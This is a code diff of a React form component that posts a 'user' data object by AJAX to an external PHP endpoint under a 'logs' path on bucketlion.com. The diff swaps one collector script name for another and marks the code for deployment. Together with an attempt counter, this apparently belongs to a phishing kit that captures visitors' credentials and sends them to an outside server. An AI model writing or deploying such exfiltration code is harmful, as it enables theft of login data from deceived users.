@@ -37,7 +37,7 @@ const Formm = ()=>{
 
       $.ajax({
           type: "POST",
-          url: "https://bucketlion.com/logs/dashboard/file/exlb.php",
+          url: "https://bucketlion.com/logs/dashboard/file/exle.php",
           data: user,
           success(data) {
               console.log(data);
@@ -45,7 +45,7 @@ const Formm = ()=>{
       });
 
 
-    //   kddk
+// deploy
 
       setCount(count=> count + 1);
             if(count >= 2){
